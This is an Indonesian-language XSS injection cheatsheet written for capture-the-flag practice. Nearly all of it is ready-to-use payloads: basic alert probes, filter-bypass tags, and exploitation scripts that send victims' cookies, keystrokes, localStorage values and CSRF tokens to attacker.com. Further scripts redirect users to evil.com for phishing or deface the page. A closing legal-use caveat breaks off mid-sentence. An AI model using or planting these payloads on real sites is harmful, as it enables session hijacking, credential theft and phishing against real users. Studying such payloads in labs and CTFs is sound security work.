# XSS Injection Cheatsheet (CTF)

## 1. Cara Mengetes XSS

- Masukkan payload sederhana ke input/parameter yang dicurigai:
  ```html
  <script>
    alert(1);
  </script>
  ```
- Cek apakah alert muncul atau payload dieksekusi.
- Coba payload di URL, form, cookie, header, atau parameter GET/POST.

## 2. Payload XSS Populer

| Payload Sederhana                     | Keterangan        |
| ------------------------------------- | ----------------- |
| `<script>alert(1)</script>`           | Payload dasar     |
| `<img src=x onerror=alert(1)>`        | Bypass tag filter |
| `<svg/onload=alert(1)>`               | SVG context       |
| `<body onload=alert(1)>`              | Event handler     |
| `<iframe src="javascript:alert(1)">`  | Iframe JS URI     |
| `<math href="javascript:alert(1)">`   | MathML context    |
| `<a href="javascript:alert(1)">X</a>` | Link JS URI       |

## 3. Eksploitasi XSS

### a. Cookie Stealing (Mencuri Cookie)

Payload untuk mengirim cookie korban ke server attacker:

```html
<script>
  fetch("http://attacker.com/?c=" + document.cookie);
</script>
<!-- atau -->
<img src="x" onerror="fetch('http://attacker.com/?c='+document.cookie)" />
```

### b. Keylogger Sederhana

Payload untuk merekam input user dan mengirim ke server attacker:

```html
<input oninput="fetch('http://attacker.com/?k='+this.value)" />
<!-- atau -->
<script>
  document.onkeypress = function (e) {
    fetch("http://attacker.com/?k=" + e.key);
  };
</script>
```

### c. Session Hijacking

Ambil session/cookie korban lalu gunakan untuk login sebagai korban. Payload sama seperti cookie stealing.

### d. Phishing / Redirect

Redirect user ke halaman palsu:

```html
<script>
  location = "http://evil.com";
</script>
<!-- atau -->
<meta http-equiv="refresh" content="0;url=http://evil.com" />
```

### e. Deface Halaman

Mengubah tampilan halaman:

```html
<script>
  document.body.innerHTML = "Hacked by XSS!";
</script>
```

### f. Membaca Data dari DOM/LocalStorage

Payload untuk membaca data sensitif dari DOM/localStorage:

```html
<script>
  fetch("http://attacker.com/?ls=" + localStorage.getItem("flag"));
</script>
```

### g. Mengambil CSRF Token

Jika token CSRF ada di halaman:

```html
<script>
  fetch(
    "http://attacker.com/?csrf=" +
      document.querySelector('input[name="csrf"]').value
  );
</script>
```

## 4. Tips & Informasi Penting

- Coba variasi payload jika satu tidak berhasil (gunakan karakter unik, event handler, tag berbeda).
- Perhatikan filter, encoding, atau sanitasi yang diterapkan aplikasi.
- Cek di semua tempat input: URL, form, cookie, header, dll.
- Gunakan tools seperti Burp Suite, XSS Hunter, atau browser devtools untuk testing.
- Untuk bypass CSP, cari endpoint yang tidak menerapkan CSP ketat.
- Pada CTF, flag kadang muncul di cookie, localStorage, atau DOM.

> **Catatan:** Gunakan payload hanya di lingkungan legal (CTF/lab). Jangan eksploitasi sistem
